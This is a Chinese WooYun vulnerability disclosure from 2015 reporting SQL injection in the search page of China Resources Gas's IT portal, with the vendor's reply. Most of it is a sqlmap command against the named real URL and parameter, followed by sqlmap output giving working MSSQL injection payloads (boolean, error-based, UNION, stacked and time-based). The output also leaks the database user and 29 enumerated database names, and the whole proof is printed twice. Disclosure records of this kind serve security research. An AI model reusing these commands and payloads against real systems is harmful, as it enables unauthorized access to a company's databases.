wybug_title: 华润燃气信息化门户搜索处存在SQL注入
wybug_corp: 华润燃气(集团)有限公司
wybug_detail: 漏洞详情 披露状态：   									2015-07-27：	细节已通知厂商并且等待厂商处理中									2015-07-27：	厂商已经确认，细节仅向厂商公开									2015-08-06：	细节向核心白帽子及相关领域专家公开									2015-08-16：	细节向普通白帽子公开									2015-08-26：	细节向实习白帽子公开									2015-09-10：	细节向公众公开  简要描述： 华润燃气信息化门户搜索处存在SQL注入 详细说明：  http://it.crcgas.net/search.aspx?id=a注入点id用sqlmap跑下sqlmap.py -u "http://it.crcgas.net/search.aspx?id=a" -p "id" --dbs --current-user --current-dbsqlmap identified the following injection points with a total of 78 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=a%' AND 5668=5668 AND '%'='    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=a%' AND 2386=CONVERT(INT,(CHAR(58)+CHAR(101)+CHAR(102)+CHAR(117)+CHAR(58)+(SELECT (CASE WHEN (2386=2386) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(102)+CHAR(106)+CHAR(106)+CHAR(58))) AND '%'='    Type: UNION query    Title: Generic UNION query (NULL) - 6 columns    Payload: id=a%' UNION ALL SELECT NULL, CHAR(58)+CHAR(101)+CHAR(102)+CHAR(117)+CHAR(58)+CHAR(117)+CHAR(107)+CHAR(79)+CHAR(76)+CHAR(100)+CHAR(84)+CHAR(87)+CHAR(99)+CHAR(100)+CHAR(119)+CHAR(58)+CHAR(102)+CHAR(106)+CHAR(106)+CHAR(58), NULL, NULL, NULL, NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=a%'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=a%' WAITFOR DELAY '0:0:5'-----[15:01:28] [INFO] testing MySQL[15:01:28] [WARNING] the back-end DBMS is not MySQL[15:01:28] [INFO] testing Oracle[15:01:28] [WARNING] the back-end DBMS is not Oracle[15:01:28] [INFO] testing PostgreSQL[15:01:28] [WARNING] the back-end DBMS is not PostgreSQL[15:01:28] [INFO] testing Microsoft SQL Server[15:01:29] [INFO] confirming Microsoft SQL Server[15:01:29] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[15:01:29] [INFO] fetching current usercurrent user:    'sq_rmis'[15:01:30] [INFO] fetching current databasecurrent database:    'sq_rmis'[15:01:30] [INFO] fetching database namesavailable databases [29]:[*] a0103123601[*] a0107163637[*] a0227155438[*] a05211243092[*] a0526174232[*] a0604103832[*] a0615115402[*] a0617184309[*] a0627170803[*] a07081000429[*] a1204143833[*] a1205155319[*] master[*] model[*] msdb[*] sq_13537897696[*] sq_crcgas[*] sq_crcgashr[*] sq_daerp[*] sq_dreamson[*] sq_haian99[*] sq_huafei[*] sq_Manager[*] sq_orderSystem[*] sq_qmmanager[*] sq_rmis[*] sq_yangsizhuan1[*] sq_yongjidb[*] tempdb   漏洞证明：  sqlmap identified the following injection points with a total of 78 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=a%' AND 5668=5668 AND '%'='    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=a%' AND 2386=CONVERT(INT,(CHAR(58)+CHAR(101)+CHAR(102)+CHAR(117)+CHAR(58)+(SELECT (CASE WHEN (2386=2386) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(102)+CHAR(106)+CHAR(106)+CHAR(58))) AND '%'='    Type: UNION query    Title: Generic UNION query (NULL) - 6 columns    Payload: id=a%' UNION ALL SELECT NULL, CHAR(58)+CHAR(101)+CHAR(102)+CHAR(117)+CHAR(58)+CHAR(117)+CHAR(107)+CHAR(79)+CHAR(76)+CHAR(100)+CHAR(84)+CHAR(87)+CHAR(99)+CHAR(100)+CHAR(119)+CHAR(58)+CHAR(102)+CHAR(106)+CHAR(106)+CHAR(58), NULL, NULL, NULL, NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=a%'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=a%' WAITFOR DELAY '0:0:5'-----[15:01:28] [INFO] testing MySQL[15:01:28] [WARNING] the back-end DBMS is not MySQL[15:01:28] [INFO] testing Oracle[15:01:28] [WARNING] the back-end DBMS is not Oracle[15:01:28] [INFO] testing PostgreSQL[15:01:28] [WARNING] the back-end DBMS is not PostgreSQL[15:01:28] [INFO] testing Microsoft SQL Server[15:01:29] [INFO] confirming Microsoft SQL Server[15:01:29] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[15:01:29] [INFO] fetching current usercurrent user:    'sq_rmis'[15:01:30] [INFO] fetching current databasecurrent database:    'sq_rmis'[15:01:30] [INFO] fetching database namesavailable databases [29]:[*] a0103123601[*] a0107163637[*] a0227155438[*] a05211243092[*] a0526174232[*] a0604103832[*] a0615115402[*] a0617184309[*] a0627170803[*] a07081000429[*] a1204143833[*] a1205155319[*] master[*] model[*] msdb[*] sq_13537897696[*] sq_crcgas[*] sq_crcgashr[*] sq_daerp[*] sq_dreamson[*] sq_haian99[*] sq_huafei[*] sq_Manager[*] sq_orderSystem[*] sq_qmmanager[*] sq_rmis[*] sq_yangsizhuan1[*] sq_yongjidb[*] tempdb   修复方案：  过滤特殊字符   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-07-27 16:17 厂商回复： 漏洞级别为高，但是该业务仅用于信息展示，所以风险来说还是比较小的，非常感谢！ 最新状态： 暂无
